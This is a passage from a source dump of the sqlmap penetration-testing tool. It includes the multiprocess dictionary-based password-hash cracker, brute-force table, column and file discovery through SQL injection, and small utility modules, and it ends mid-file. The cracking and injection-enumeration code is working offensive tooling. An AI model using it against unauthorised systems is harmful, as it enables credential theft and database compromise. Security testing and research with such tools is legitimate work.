https://docs.microsoft.com/en-us/sql/t-sql/functions/hashbytes-transact-sql?view=sql-server-2017\n                                hash_ = hash_[2:]\n                            item = [(user, hash_), {}]\n                        elif hash_regex in (HASH.SSHA,):\n                            item = [(user, hash_), {\"salt\": decodeBase64(hash_, binary=True)[20:]}]\n                        elif hash_regex in (HASH.SSHA256,):\n                            item = [(user, hash_), {\"salt\": decodeBase64(hash_, binary=True)[32:]}]\n                        elif hash_regex in (HASH.SSHA512,):\n                            item = [(user, hash_), {\"salt\": decodeBase64(hash_, binary=True)[64:]}]\n                        elif hash_regex in (HASH.ORACLE_OLD, HASH.POSTGRES):\n                            item = [(user, hash_), {'username': user}]\n                        elif hash_regex in (HASH.ORACLE,):\n                            item = [(user, hash_), {\"salt\": hash_[-20:]}]\n                        elif hash_regex in (HASH.MSSQL, HASH.MSSQL_OLD, HASH.MSSQL_NEW):\n                            item = [(user, hash_), {\"salt\": hash_[6:14]}]\n                        elif hash_regex in (HASH.CRYPT_GENERIC,):\n                            item = [(user, hash_), {\"salt\": hash_[0:2]}]\n                        elif hash_regex in (HASH.UNIX_MD5_CRYPT, HASH.APACHE_MD5_CRYPT):\n                            item = [(user, hash_), {\"salt\": hash_.split('$')[2], \"magic\": \"$%s$\" % hash_.split('$')[1]}]\n                        elif hash_regex in (HASH.JOOMLA, HASH.VBULLETIN, HASH.VBULLETIN_OLD):\n                            item = [(user, hash_), {\"salt\": hash_.split(':')[-1]}]\n                        elif hash_regex in (HASH.DJANGO_MD5, HASH.DJANGO_SHA1):\n                            item = [(user, hash_), {\"salt\": hash_.split('$')[1]}]\n                        elif hash_regex in (HASH.PHPASS,):\n                            if ITOA64.index(hash_[3]) < 32:\n                                item = [(user, hash_), {\"salt\": hash_[4:12], \"count\": 1 << ITOA64.index(hash_[3]), \"prefix\": hash_[:3]}]\n                            else:\n                                warnMsg = \"invalid hash '%s'\" % hash_\n                                logger.warning(warnMsg)\n\n                        if item and hash_ not in keys:\n                            resumed = hashDBRetrieve(hash_)\n                            if not resumed:\n                                attack_info.append(item)\n                                user_hash.append(item[0])\n                            else:\n                                infoMsg = \"resuming password '%s' for hash '%s'\" % (resumed, hash_)\n                                if user and not user.startswith(DUMMY_USER_PREFIX):\n                                    infoMsg += \" for user '%s'\" % user\n                                logger.info(infoMsg)\n                                resumes.append((user, hash_, resumed))\n                            keys.add(hash_)\n\n                    except (binascii.Error, TypeError, IndexError):\n                        pass\n\n        if not attack_info:\n            continue\n\n        if not kb.wordlists:\n            while not kb.wordlists:\n\n                # the slowest of all methods hence smaller default dict\n                if hash_regex in (HASH.ORACLE_OLD, HASH.PHPASS):\n                    dictPaths = [paths.SMALL_DICT]\n                else:\n                    dictPaths = [paths.WORDLIST]\n\n                message = \"what dictionary do you want to use?\\n\"\n                message += \"[1] default dictionary file '%s' (press Enter)\\n\" % dictPaths[0]\n                message += \"[2] custom dictionary file\\n\"\n                message += \"[3] file with list of dictionary files\"\n                choice = readInput(message, default='1')\n\n                try:\n                    if choice == '2':\n                        message = \"what's the custom dictionary's location?\\n\"\n                        dictPath = readInput(message)\n                        if dictPath:\n                            dictPaths = [dictPath]\n                            logger.info(\"using custom dictionary\")\n                    elif choice == '3':\n                        message = \"what's the list file location?\\n\"\n                        listPath = readInput(message)\n                        checkFile(listPath)\n                        dictPaths = getFileItems(listPath)\n                        logger.info(\"using custom list of dictionaries\")\n                    else:\n                        logger.info(\"using default dictionary\")\n\n                    dictPaths = [_ for _ in dictPaths if _]\n\n                    for dictPath in dictPaths:\n                        checkFile(dictPath)\n\n                        if isZipFile(dictPath):\n                            _ = zipfile.ZipFile(dictPath, 'r')\n                            if len(_.namelist()) == 0:\n                                errMsg = \"no file(s) inside '%s'\" % dictPath\n                                raise SqlmapDataException(errMsg)\n                            else:\n                                _.open(_.namelist()[0])\n\n                    kb.wordlists = dictPaths\n\n                except Exception as ex:\n                    warnMsg = \"there was a problem while loading dictionaries\"\n                    warnMsg += \" ('%s')\" % getSafeExString(ex)\n                    logger.critical(warnMsg)\n\n            message = \"do you want to use common password suffixes? (slow!) [y/N] \"\n\n            if readInput(message, default='N', boolean=True):\n                suffix_list += COMMON_PASSWORD_SUFFIXES\n\n        infoMsg = \"starting dictionary-based cracking (%s)\" % __functions__[hash_regex].__name__\n        logger.info(infoMsg)\n\n        for item in attack_info:\n            ((user, _), _) = item\n            if user and not user.startswith(DUMMY_USER_PREFIX):\n                custom_wordlist.append(normalizeUnicode(user))\n\n        # Algorithms without extra arguments (e.g. salt and/or username)\n        if hash_regex in (HASH.MYSQL, HASH.MYSQL_OLD, HASH.MD5_GENERIC, HASH.SHA1_GENERIC, HASH.SHA224_GENERIC, HASH.SHA256_GENERIC, HASH.SHA384_GENERIC, HASH.SHA512_GENERIC, HASH.APACHE_SHA1):\n            for suffix in suffix_list:\n                if not attack_info or processException:\n                    break\n\n                if suffix:\n                    clearConsoleLine()\n                    infoMsg = \"using suffix '%s'\" % suffix\n                    logger.info(infoMsg)\n\n                retVal = None\n                processes = []\n\n                try:\n                    if _multiprocessing:\n                        if _multiprocessing.cpu_count() > 1:\n                            infoMsg = \"starting %d processes \" % _multiprocessing.cpu_count()\n                            singleTimeLogMessage(infoMsg)\n\n                        gc.disable()\n\n                        retVal = _multiprocessing.Queue()\n                        count = _multiprocessing.Value('i', _multiprocessing.cpu_count())\n\n                        for i in xrange(_multiprocessing.cpu_count()):\n                            process = _multiprocessing.Process(target=_bruteProcessVariantA, args=(attack_info, hash_regex, suffix, retVal, i, count, kb.wordlists, custom_wordlist, conf.api))\n                            processes.append(process)\n\n                        for process in processes:\n                            process.daemon = True\n                            process.start()\n\n                        while count.value > 0:\n                            time.sleep(0.5)\n\n                    else:\n                        warnMsg = \"multiprocessing hash cracking is currently \"\n                        warnMsg += \"%s on this platform\" % (\"not supported\" if not conf.disableMulti else \"disabled\")\n                        singleTimeWarnMessage(warnMsg)\n\n                        retVal = _queue.Queue()\n                        _bruteProcessVariantA(attack_info, hash_regex, suffix, retVal, 0, 1, kb.wordlists, custom_wordlist, conf.api)\n\n                except KeyboardInterrupt:\n                    print()\n                    processException = True\n                    warnMsg = \"user aborted during dictionary-based attack phase (Ctrl+C was pressed)\"\n                    logger.warning(warnMsg)\n\n                finally:\n                    _finalize(retVal, results, processes, attack_info)\n\n            clearConsoleLine()\n\n        else:\n            for ((user, hash_), kwargs) in attack_info:\n                if processException:\n                    break\n\n                if any(_[0] == user and _[1] == hash_ for _ in results):\n                    continue\n\n                count = 0\n                found = False\n\n                for suffix in suffix_list:\n                    if found or processException:\n                        break\n\n                    if suffix:\n                        clearConsoleLine()\n                        infoMsg = \"using suffix '%s'\" % suffix\n                        logger.info(infoMsg)\n\n                    retVal = None\n                    processes = []\n\n                    try:\n                        if _multiprocessing:\n                            if _multiprocessing.cpu_count() > 1:\n                                infoMsg = \"starting %d processes \" % _multiprocessing.cpu_count()\n                                singleTimeLogMessage(infoMsg)\n\n                            gc.disable()\n\n                            retVal = _multiprocessing.Queue()\n                            found_ = _multiprocessing.Value('i', False)\n                            count = _multiprocessing.Value('i', _multiprocessing.cpu_count())\n\n                            for i in xrange(_multiprocessing.cpu_count()):\n                                process = _multiprocessing.Process(target=_bruteProcessVariantB, args=(user, hash_, kwargs, hash_regex, suffix, retVal, found_, i, count, kb.wordlists, custom_wordlist, conf.api))\n                                processes.append(process)\n\n                            for process in processes:\n                                process.daemon = True\n                                process.start()\n\n                            while count.value > 0:\n                                time.sleep(0.5)\n\n                            found = found_.value != 0\n\n                        else:\n                            warnMsg = \"multiprocessing hash cracking is currently \"\n                            warnMsg += \"%s on this platform\" % (\"not supported\" if not conf.disableMulti else \"disabled\")\n                            singleTimeWarnMessage(warnMsg)\n\n                            class Value(object):\n                                pass\n\n                            retVal = _queue.Queue()\n                            found_ = Value()\n                            found_.value = False\n\n                            _bruteProcessVariantB(user, hash_, kwargs, hash_regex, suffix, retVal, found_, 0, 1, kb.wordlists, custom_wordlist, conf.api)\n\n                            found = found_.value\n\n                    except KeyboardInterrupt:\n                        print()\n                        processException = True\n                        warnMsg = \"user aborted during dictionary-based attack phase (Ctrl+C was pressed)\"\n                        logger.warning(warnMsg)\n\n                        for process in processes:\n                            try:\n                                process.terminate()\n                                process.join()\n                            except (OSError, AttributeError):\n                                pass\n\n                    finally:\n                        _finalize(retVal, results, processes, attack_info)\n\n                clearConsoleLine()\n\n    results.extend(resumes)\n\n    if foundHash and len(hash_regexes) == 0:\n        warnMsg = \"unknown hash format\"\n        logger.warning(warnMsg)\n\n    if len(results) == 0:\n        warnMsg = \"no clear password(s) found\"\n        logger.warning(warnMsg)\n\n    return results\n\ndef crackHashFile(hashFile):\n    i = 0\n    attack_dict = {}\n\n    for line in getFileItems(conf.hashFile):\n        if ':' in line:\n            user, hash_ = line.split(':', 1)\n            attack_dict[user] = [hash_]\n        else:\n            attack_dict[\"%s%d\" % (DUMMY_USER_PREFIX, i)] = [line]\n            i += 1\n\n    dictionaryAttack(attack_dict)\n", "lib/utils/brute.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport time\n\nfrom lib.core.common import Backend\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import filterListValue\nfrom lib.core.common import getFileItems\nfrom lib.core.common import getPageWordSet\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomInt\nfrom lib.core.common import randomStr\nfrom lib.core.common import readInput\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import BRUTE_COLUMN_EXISTS_TEMPLATE\nfrom lib.core.settings import BRUTE_TABLE_EXISTS_TEMPLATE\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import UPPER_CASE_DBMSES\nfrom lib.core.threads import getCurrentThreadData\nfrom lib.core.threads import runThreads\nfrom lib.request import inject\n\ndef _addPageTextWords():\n    wordsList = []\n\n    infoMsg = \"adding words used on web page to the check list\"\n    logger.info(infoMsg)\n    pageWords = getPageWordSet(kb.originalPage)\n\n    for word in pageWords:\n        word = word.lower()\n\n        if len(word) > 2 and not word[0].isdigit() and word not in wordsList:\n            wordsList.append(word)\n\n    return wordsList\n\n@stackedmethod\ndef tableExists(tableFile, regex=None):\n    if kb.choices.tableExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:\n        warnMsg = \"it's not recommended to use '%s' and/or '%s' \" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])\n        warnMsg += \"for common table existence check\"\n        logger.warning(warnMsg)\n\n        message = \"are you sure you want to continue? [y/N] \"\n        kb.choices.tableExists = readInput(message, default='N', boolean=True)\n\n        if not kb.choices.tableExists:\n            return None\n\n    result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr())))\n\n    if result:\n        errMsg = \"can't use table existence check because of detected invalid results \"\n        errMsg += \"(most likely caused by inability of the used injection \"\n        errMsg += \"to distinguish erroneous results)\"\n        raise SqlmapDataException(errMsg)\n\n    pushValue(conf.db)\n\n    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n        conf.db = conf.db.upper()\n\n    message = \"which common tables (wordlist) file do you want to use?\\n\"\n    message += \"[1] default '%s' (press Enter)\\n\" % tableFile\n    message += \"[2] custom\"\n    choice = readInput(message, default='1')\n\n    if choice == '2':\n        message = \"what's the custom common tables file location?\\n\"\n        tableFile = readInput(message) or tableFile\n\n    infoMsg = \"performing table existence using items from '%s'\" % tableFile\n    logger.info(infoMsg)\n\n    tables = getFileItems(tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS,), unique=True)\n    tables.extend(_addPageTextWords())\n    tables = filterListValue(tables, regex)\n\n    for conf.db in (conf.db.split(',') if conf.db else [conf.db]):\n        if conf.db and METADB_SUFFIX not in conf.db:\n            infoMsg = \"checking database '%s'\" % conf.db\n            logger.info(infoMsg)\n\n        threadData = getCurrentThreadData()\n        threadData.shared.count = 0\n        threadData.shared.limit = len(tables)\n        threadData.shared.files = []\n        threadData.shared.unique = set()\n\n        def tableExistsThread():\n            threadData = getCurrentThreadData()\n\n            while kb.threadContinue:\n                kb.locks.count.acquire()\n                if threadData.shared.count < threadData.shared.limit:\n                    table = safeSQLIdentificatorNaming(tables[threadData.shared.count], True)\n                    threadData.shared.count += 1\n                    kb.locks.count.release()\n                else:\n                    kb.locks.count.release()\n                    break\n\n                if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):\n                    fullTableName = \"%s.%s\" % (conf.db, table)\n                else:\n                    fullTableName = table\n\n                if Backend.isDbms(DBMS.MCKOI):\n                    _ = randomInt(1)\n                    result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(\"%d=(SELECT %d FROM %s)\", (_, _, fullTableName)))\n                else:\n                    result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), fullTableName)))\n\n                kb.locks.io.acquire()\n\n                if result and table.lower() not in threadData.shared.unique:\n                    threadData.shared.files.append(table)\n                    threadData.shared.unique.add(table.lower())\n\n                    if conf.verbose in (1, 2) and not conf.api:\n                        clearConsoleLine(True)\n                        infoMsg = \"[%s] [INFO] retrieved: %s\\n\" % (time.strftime(\"%X\"), unsafeSQLIdentificatorNaming(table))\n                        dataToStdout(infoMsg, True)\n\n                if conf.verbose in (1, 2):\n                    status = '%d/%d items (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))\n                    dataToStdout(\"\\r[%s] [INFO] tried %s\" % (time.strftime(\"%X\"), status), True)\n\n                kb.locks.io.release()\n\n        try:\n            runThreads(conf.threads, tableExistsThread, threadChoice=True)\n        except KeyboardInterrupt:\n            warnMsg = \"user aborted during table existence \"\n            warnMsg += \"check. sqlmap will display partial output\"\n            logger.warning(warnMsg)\n\n        clearConsoleLine(True)\n        dataToStdout(\"\\n\")\n\n        if not threadData.shared.files:\n            warnMsg = \"no table(s) found\"\n            if conf.db:\n                warnMsg += \" for database '%s'\" % conf.db\n            logger.warning(warnMsg)\n        else:\n            for item in threadData.shared.files:\n                if conf.db not in kb.data.cachedTables:\n                    kb.data.cachedTables[conf.db] = [item]\n                else:\n                    kb.data.cachedTables[conf.db].append(item)\n\n        for _ in ((conf.db, item) for item in threadData.shared.files):\n            if _ not in kb.brute.tables:\n                kb.brute.tables.append(_)\n\n    conf.db = popValue()\n    hashDBWrite(HASHDB_KEYS.KB_BRUTE_TABLES, kb.brute.tables, True)\n\n    return kb.data.cachedTables\n\ndef columnExists(columnFile, regex=None):\n    if kb.choices.columnExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:\n        warnMsg = \"it's not recommended to use '%s' and/or '%s' \" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])\n        warnMsg += \"for common column existence check\"\n        logger.warning(warnMsg)\n\n        message = \"are you sure you want to continue? [y/N] \"\n        kb.choices.columnExists = readInput(message, default='N', boolean=True)\n\n        if not kb.choices.columnExists:\n            return None\n\n    if not conf.tbl:\n        errMsg = \"missing table parameter\"\n        raise SqlmapMissingMandatoryOptionException(errMsg)\n\n    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:\n        conf.db = conf.db.upper()\n\n    result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (randomStr(), randomStr())))\n\n    if result:\n        errMsg = \"can't use column existence check because of detected invalid results \"\n        errMsg += \"(most likely caused by inability of the used injection \"\n        errMsg += \"to distinguish erroneous results)\"\n        raise SqlmapDataException(errMsg)\n\n    message = \"which common columns (wordlist) file do you want to use?\\n\"\n    message += \"[1] default '%s' (press Enter)\\n\" % columnFile\n    message += \"[2] custom\"\n    choice = readInput(message, default='1')\n\n    if choice == '2':\n        message = \"what's the custom common columns file location?\\n\"\n        columnFile = readInput(message) or columnFile\n\n    infoMsg = \"checking column existence using items from '%s'\" % columnFile\n    logger.info(infoMsg)\n\n    columns = getFileItems(columnFile, unique=True)\n    columns.extend(_addPageTextWords())\n    columns = filterListValue(columns, regex)\n\n    table = safeSQLIdentificatorNaming(conf.tbl, True)\n\n    if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):\n        table = \"%s.%s\" % (safeSQLIdentificatorNaming(conf.db), table)\n\n    kb.threadContinue = True\n    kb.bruteMode = True\n\n    threadData = getCurrentThreadData()\n    threadData.shared.count = 0\n    threadData.shared.limit = len(columns)\n    threadData.shared.files = []\n\n    def columnExistsThread():\n        threadData = getCurrentThreadData()\n\n        while kb.threadContinue:\n            kb.locks.count.acquire()\n            if threadData.shared.count < threadData.shared.limit:\n                column = safeSQLIdentificatorNaming(columns[threadData.shared.count])\n                threadData.shared.count += 1\n                kb.locks.count.release()\n            else:\n                kb.locks.count.release()\n                break\n\n            if Backend.isDbms(DBMS.MCKOI):\n                result = inject.checkBooleanExpression(safeStringFormat(\"0<(SELECT COUNT(%s) FROM %s)\", (column, table)))\n            else:\n                result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (column, table)))\n\n            kb.locks.io.acquire()\n\n            if result:\n                threadData.shared.files.append(column)\n\n                if conf.verbose in (1, 2) and not conf.api:\n                    clearConsoleLine(True)\n                    infoMsg = \"[%s] [INFO] retrieved: %s\\n\" % (time.strftime(\"%X\"), unsafeSQLIdentificatorNaming(column))\n                    dataToStdout(infoMsg, True)\n\n            if conf.verbose in (1, 2):\n                status = \"%d/%d items (%d%%)\" % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))\n                dataToStdout(\"\\r[%s] [INFO] tried %s\" % (time.strftime(\"%X\"), status), True)\n\n            kb.locks.io.release()\n\n    try:\n        runThreads(conf.threads, columnExistsThread, threadChoice=True)\n    except KeyboardInterrupt:\n        warnMsg = \"user aborted during column existence \"\n        warnMsg += \"check. sqlmap will display partial output\"\n        logger.warning(warnMsg)\n    finally:\n        kb.bruteMode = False\n\n    clearConsoleLine(True)\n    dataToStdout(\"\\n\")\n\n    if not threadData.shared.files:\n        warnMsg = \"no column(s) found\"\n        logger.warning(warnMsg)\n    else:\n        columns = {}\n\n        for column in threadData.shared.files:\n            if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):\n                result = not inject.checkBooleanExpression(\"%s\" % safeStringFormat(\"EXISTS(SELECT %s FROM %s WHERE %s REGEXP '[^0-9]')\", (column, table, column)))\n            elif Backend.getIdentifiedDbms() in (DBMS.SQLITE,):\n                result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(\"EXISTS(SELECT %s FROM %s WHERE %s NOT GLOB '*[^0-9]*')\", (column, table, column)))\n            elif Backend.getIdentifiedDbms() in (DBMS.MCKOI,):\n                result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(\"0=(SELECT MAX(%s)-MAX(%s) FROM %s)\", (column, column, table)))\n            else:\n                result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(\"EXISTS(SELECT %s FROM %s WHERE ROUND(%s)=ROUND(%s))\", (column, table, column, column)))\n\n            if result:\n                columns[column] = \"numeric\"\n            else:\n                columns[column] = \"non-numeric\"\n\n        kb.data.cachedColumns[conf.db] = {conf.tbl: columns}\n\n        for _ in ((conf.db, conf.tbl, item[0], item[1]) for item in columns.items()):\n            if _ not in kb.brute.columns:\n                kb.brute.columns.append(_)\n\n        hashDBWrite(HASHDB_KEYS.KB_BRUTE_COLUMNS, kb.brute.columns, True)\n\n    return kb.data.cachedColumns\n\n@stackedmethod\ndef fileExists(pathFile):\n    retVal = []\n\n    message = \"which common files file do you want to use?\\n\"\n    message += \"[1] default '%s' (press Enter)\\n\" % pathFile\n    message += \"[2] custom\"\n    choice = readInput(message, default='1')\n\n    if choice == '2':\n        message = \"what's the custom common files file location?\\n\"\n        pathFile = readInput(message) or pathFile\n\n    infoMsg = \"checking files existence using items from '%s'\" % pathFile\n    logger.info(infoMsg)\n\n    paths = getFileItems(pathFile, unique=True)\n\n    kb.bruteMode = True\n\n    try:\n        conf.dbmsHandler.readFile(randomStr())\n    except SqlmapNoneDataException:\n        pass\n    except:\n        kb.bruteMode = False\n        raise\n\n    threadData = getCurrentThreadData()\n    threadData.shared.count = 0\n    threadData.shared.limit = len(paths)\n    threadData.shared.files = []\n\n    def fileExistsThread():\n        threadData = getCurrentThreadData()\n\n        while kb.threadContinue:\n            kb.locks.count.acquire()\n            if threadData.shared.count < threadData.shared.limit:\n                path = ntToPosixSlashes(paths[threadData.shared.count])\n                threadData.shared.count += 1\n                kb.locks.count.release()\n            else:\n                kb.locks.count.release()\n                break\n\n            try:\n                result = unArrayizeValue(conf.dbmsHandler.readFile(path))\n            except SqlmapNoneDataException:\n                result = None\n\n            kb.locks.io.acquire()\n\n            if not isNoneValue(result):\n                threadData.shared.files.append(result)\n\n                if not conf.api:\n                    clearConsoleLine(True)\n                    infoMsg = \"[%s] [INFO] retrieved: '%s'\\n\" % (time.strftime(\"%X\"), path)\n                    dataToStdout(infoMsg, True)\n\n            if conf.verbose in (1, 2):\n                status = '%d/%d items (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))\n                dataToStdout(\"\\r[%s] [INFO] tried %s\" % (time.strftime(\"%X\"), status), True)\n\n            kb.locks.io.release()\n\n    try:\n        runThreads(conf.threads, fileExistsThread, threadChoice=True)\n    except KeyboardInterrupt:\n        warnMsg = \"user aborted during file existence \"\n        warnMsg += \"check. sqlmap will display partial output\"\n        logger.warning(warnMsg)\n    finally:\n        kb.bruteMode = False\n\n    clearConsoleLine(True)\n    dataToStdout(\"\\n\")\n\n    if not threadData.shared.files:\n        warnMsg = \"no file(s) found\"\n        logger.warning(warnMsg)\n    else:\n        retVal = threadData.shared.files\n\n    return retVal\n", "lib/utils/xrange.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport numbers\n\nclass xrange(object):\n    \"\"\"\n    Advanced (re)implementation of xrange (supports slice/copy/etc.)\n    Reference: http://code.activestate.com/recipes/521885-a-pythonic-implementation-of-xrange/\n\n    >>> list(xrange(1, 9)) == list(range(1, 9))\n    True\n    >>> list(xrange(8, 0, -16)) == list(range(8, 0, -16))\n    True\n    >>> list(xrange(0, 8, 16)) == list(range(0, 8, 16))\n    True\n    >>> list(xrange(0, 4, 5)) == list(range(0, 4, 5))\n    True\n    >>> list(xrange(4, 0, 3)) == list(range(4, 0, 3))\n    True\n    >>> list(xrange(0, -3)) == list(range(0, -3))\n    True\n    >>> list(xrange(0, 7, 2)) == list(range(0, 7, 2))\n    True\n    >>> foobar = xrange(1, 10)\n    >>> 7 in foobar\n    True\n    >>> 11 in foobar\n    False\n    >>> foobar[0]\n    1\n    \"\"\"\n\n    __slots__ = ['_slice']\n\n    def __init__(self, *args):\n        if args and isinstance(args[0], type(self)):\n            self._slice = slice(args[0].start, args[0].stop, args[0].step)\n        else:\n            self._slice = slice(*args)\n        if self._slice.stop is None:\n            raise TypeError(\"xrange stop must not be None\")\n\n    @property\n    def start(self):\n        if self._slice.start is not None:\n            return self._slice.start\n        return 0\n\n    @property\n    def stop(self):\n        return self._slice.stop\n\n    @property\n    def step(self):\n        if self._slice.step is not None:\n            return self._slice.step\n        return 1\n\n    def __hash__(self):\n        return hash(self._slice)\n\n    def __repr__(self):\n        return '%s(%r, %r, %r)' % (type(self).__name__, self.start, self.stop, self.step)\n\n    def __len__(self):\n        return self._len()\n\n    def _len(self):\n        return max(0, 1 + int((self.stop - 1 - self.start) // self.step))\n\n    def __contains__(self, value):\n        return (self.start <= value < self.stop) and (value - self.start) % self.step == 0\n\n    def __getitem__(self, index):\n        if isinstance(index, slice):\n            start, stop, step = index.indices(self._len())\n            return xrange(self._index(start),\n                          self._index(stop), step * self.step)\n        elif isinstance(index, numbers.Integral):\n            if index < 0:\n                fixed_index = index + self._len()\n            else:\n                fixed_index = index\n\n            if not 0 <= fixed_index < self._len():\n                raise IndexError(\"Index %d out of %r\" % (index, self))\n\n            return self._index(fixed_index)\n        else:\n            raise TypeError(\"xrange indices must be slices or integers\")\n\n    def _index(self, i):\n        return self.start + self.step * i\n\n    def index(self, i):\n        if self.start <= i < self.stop:\n            return i - self.start\n        else:\n            raise ValueError(\"%d is not in list\" % i)\n", "lib/utils/timeout.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport threading\n\nfrom lib.core.data import logger\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import TIMEOUT_STATE\n\ndef timeout(func, args=None, kwargs=None, duration=1, default=None):\n    class InterruptableThread(threading.Thread):\n        def __init__(self):\n            threading.Thread.__init__(self)\n            self.result = None\n            self.timeout_state = None\n\n        def run(self):\n            try:\n                self.result = func(*(args or ()), **(kwargs or {}))\n                self.timeout_state = TIMEOUT_STATE.NORMAL\n            except Exception as ex:\n                logger.log(CUSTOM_LOGGING.TRAFFIC_IN, ex)\n                self.result = default\n                self.timeout_state = TIMEOUT_STATE.EXCEPTION\n\n    thread = InterruptableThread()\n    thread.start()\n    thread.join(duration)\n\n    if thread.is_alive():\n        return default, TIMEOUT_STATE.TIMEOUT\n    else:\n        return thread.result, thread.timeout_state\n", "lib/utils/getch.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nclass _Getch(object):\n    \"\"\"\n    Gets a single character from standard input.  Does not echo to\n    the screen (reference: http://code.activestate.com/recipes/134892/)\n    \"\"\"\n    def __init__(self):\n        try:\n            self.impl = _GetchWindows()\n        except ImportError:\n            try:\n                self.impl = _GetchMacCarbon()\n            except(AttributeError, ImportError):\n                self.impl = _GetchUnix()\n\n    def __call__(self):\n        return self.impl()\n\nclass _GetchUnix(object):\n    def __init__(self):\n        __import__(\"tty\")\n\n    def __call__(self):\n        import sys\n        import termios\n        import tty\n\n        fd = sys.stdin.fileno()\n        old_settings = termios.tcgetattr(fd)\n        try:\n            tty.setraw(sys.stdin.fileno())\n            ch = sys.stdin.read(1)\n        finally:\n            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)\n        return ch\n\nclass _GetchWindows(object):\n    def __init__(self):\n        __import__(\"msvcrt\")\n\n    def __call__(self):\n        import msvcrt\n        return msvcrt.getch()\n\nclass _GetchMacCarbon(object):\n    \"\"\"\n    A function which returns the current ASCII key that is down;\n    if no ASCII key is down, the null string is returned.  The\n    page http://www.mactech.com/macintosh-c/chap02-1.html was\n    very helpful in figuring out how to do this.\n    \"\"\"\n    def __init__(self):\n        import Carbon\n\n        getattr(Carbon, \"Evt\")  # see if it has this (in Unix, it doesn't)\n\n    def __call__(self):\n        import Carbon\n\n        if Carbon.Evt.EventAvail(0x0008)[0] == 0:  # 0x0008 is the keyDownMask\n            return ''\n        else:\n            #\n            # The event contains the following info:\n            # (what,msg,when,where,mod)=Carbon.Evt.GetNextEvent(0x0008)[1]\n            #\n            # The message (msg) contains the ASCII char which is\n            # extracted with the 0x000000FF charCodeMask; this\n            # number is converted to an ASCII character with chr() and\n            # returned\n            #\n            (what, msg, when, where, mod) = Carbon.Evt.GetNextEvent(0x0008)[1]\n            return chr(msg & 0x000000FF)\n\ngetch = _Getch()\n", "lib/utils/hashdb.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport hashlib\nimport os\nimport sqlite3\nimport threading\nimport time\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import serializeObject\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unserializeObject\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.settings import HASHDB_END_TRANSACTION_RETRIES\nfrom lib.core.settings import HASHDB_FLUSH_RETRIES\nfrom lib.core.settings import HASHDB_FLUSH_THRESHOLD\nfrom lib.core.settings import 